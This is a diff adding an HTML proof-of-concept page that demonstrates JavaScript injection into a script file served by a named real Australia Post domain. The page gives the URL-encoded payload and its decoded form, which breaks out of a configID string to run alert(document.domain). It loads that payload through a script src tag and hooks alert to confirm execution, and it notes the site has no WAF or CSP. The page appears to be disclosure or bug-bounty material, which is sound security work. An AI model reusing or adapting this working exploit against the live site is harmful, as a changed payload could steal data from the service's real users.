@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>AusPost collect.auspost.com.au - JS Injection PoC</title>
+<style>
+body { font-family: monospace; padding: 20px; background: #1a1a2e; color: #eee; }
+h1 { color: #e94560; }
+.status { padding: 10px; margin: 10px 0; border-radius: 4px; }
+.waiting { background: #16213e; border: 1px solid #0f3460; }
+.success { background: #1b4332; border: 1px solid #2d6a4f; color: #95d5b2; }
+.info { background: #16213e; border: 1px solid #0f3460; color: #a8dadc; }
+pre { background: #0d1117; padding: 15px; border-radius: 4px; overflow-x: auto; }
+</style>
+</head>
+<body>
+<h1>collect.auspost.com.au — JavaScript Injection PoC</h1>
+
+<div class="info status">
+<strong>Vulnerability:</strong> Unescaped double quotes in <code>configID</code> field of <code>/2/{clientId}/location-finder.js</code><br>
+<strong>Impact:</strong> Arbitrary JavaScript execution when loaded via <code>&lt;script src&gt;</code><br>
+<strong>Defenses:</strong> None (no WAF, no CSP, no input validation, no XCTO)
+</div>
+
+<div id="result" class="waiting status">Waiting for script execution...</div>
+
+<div class="info status">
+<strong>Payload URL:</strong><br>
+<pre>https://collect.auspost.com.au/2/test%22%7D%29%3B1%7Dcatch%28e%29%7B%7D%7D%7D%3Balert(document.domain)%2F%2F/location-finder.js</pre>
+</div>
+
+<h3>Decoded payload in JS context:</h3>
+<pre>configID:"test"});1}catch(e){}}};alert(document.domain)//</pre>
+
+<h3>Console output:</h3>
+<pre id="console-log"></pre>
+
+<script>
+// Capture console.log for display
+var logEl = document.getElementById('console-log');
+var _origLog = console.log;
+console.log = function() {
+    var msg = Array.prototype.join.call(arguments, ' ');
+    logEl.textContent += msg + '\n';
+    _origLog.apply(console, arguments);
+};
+
+// Capture alert for non-blocking display
+var _origAlert = window.alert;
+window.alert = function(msg) {
+    document.getElementById('result').textContent = 'XSS EXECUTED: alert(' + msg + ')';
+    document.getElementById('result').className = 'success status';
+    console.log('[PoC] alert() called with: ' + msg);
+};
+</script>
+
+<!-- This is the attack: loading the JS with injected payload via script src -->
+<script src="https://collect.auspost.com.au/2/test%22%7D%29%3B1%7Dcatch%28e%29%7B%7D%7D%7D%3Balert(document.domain)%2F%2F/location-finder.js"></script>
+
+<script>
+// Fallback status update
+setTimeout(function() {
+    var el = document.getElementById('result');
+    if (el.className.indexOf('success') === -1) {
+        el.textContent = 'Script loaded but alert may not have fired (check console)';
+    }
+}, 3000);
+</script>
+</body>
+</html>
